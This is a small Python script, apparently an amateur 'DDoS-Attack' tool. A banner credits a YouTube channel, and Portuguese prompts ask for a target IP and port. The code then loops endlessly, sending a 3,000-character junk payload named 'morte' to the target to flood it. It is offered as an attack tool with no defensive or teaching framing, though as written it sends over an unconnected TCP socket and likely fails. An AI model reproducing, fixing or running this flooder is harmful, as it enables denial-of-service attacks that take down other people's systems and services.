import socket

print("""
 DDos-Attack
 *  
  * * *
   *    
     * *  
   * *
       * 
**         
           
  *        
  youtube channel: ch33ch
Powered by: koda/ch33ch/destruction/zero x ...\n\n""")


import socket

tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = input("IP >>> ").strip()

try:
    port = int(input("Porta >>> "))
except ValueError:
    print("Use somente número na porta!!")
    exit()

morte = "###" * 1000

while True:
        tcp_socket.sendto(morte.encode('ascii'), (ip, port))
        print(f"C4OS\033[31m({ip}//{port})\033[0m :<>> PACOTE ENVIADO")
